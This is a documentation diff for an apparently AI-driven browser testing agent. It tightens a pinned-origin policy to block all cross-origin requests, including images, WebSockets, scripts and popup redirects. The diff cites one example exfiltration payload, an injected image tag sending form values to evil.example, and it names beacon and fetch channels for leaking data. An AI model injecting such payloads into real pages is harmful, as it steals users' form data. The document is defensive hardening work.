@@ -545,28 +545,30 @@ rather than burning the turn budget. Ordinary action failures (a selector that m
 a timeout) are reported the same way — previously the model could not tell a click
 that worked from one that did not.
 
-Cross-origin *rendered* sub-resources — images, fonts, stylesheets, media — are
-unaffected; refusing those would break the page the agent is reading. Blocked, when the
-origin is pinned:
+When the origin is pinned, **every cross-origin request is blocked**, whatever it loads:
 
 - `fetch`, XHR, beacons — they carry data off-origin and return readable responses, so a
   same-origin click that fires one exfiltrates before anything else sees it
+- images, fonts, stylesheets, media — nothing readable comes back, but the URL is still
+  a write channel: `<img src="https://evil.example/?c=…">` injected after the agent fills a
+  form sends the value the moment it loads (#337)
 - cross-origin **WebSockets**, closed before they connect (they need a separate hook —
   request interception does not cover a WS upgrade). Same-origin sockets are unaffected,
   so live reload and subscription transports keep working
 - **`<script src>` from another origin** — that is code execution with the page's own
   authority, not a static asset, whatever a network log makes it look like
 
-The script rule has a real cost: **a site serving its JavaScript from a CDN will not run
-under a pinned origin** and needs `--allow-cross-origin`. Taken deliberately — "executes
-attacker code, but only from a different hostname" is not a security boundary.
+This has a real cost: **a site serving its assets from a CDN will not render fully under a
+pinned origin** and needs `--allow-cross-origin`. Taken deliberately — an exemption for
+"passive" assets is an exfiltration channel with a nicer name.
 
-Residual, stated plainly:
+Popups are covered too: a popup's opening request and every redirect hop it takes are
+judged by the policy of the page that opened it, so a same-origin link that 302s elsewhere
+is stopped. A guarded page holds at most 5 popups at once; past that, a new one is closed
+before its first request goes out.
 
-- images stay exempt, so same-origin script can still beacon out via `new Image().src`.
-  Closing that means blocking cross-origin images too, which breaks far more than it protects
-- a popup's **first** request is checked by URL only; what it goes on to request is
-  then vetted in full, like any other page
+A run cannot start pinned from a page with no origin (`about:blank`, `data:`) — there is
+nothing to confine it to, so it stops with an error instead of running unconfined.
 
 Commerce is deliberately **not** on the destructive list — "make sure users can
 complete checkout" is what this loop is for, and a purchase is reversible in a way
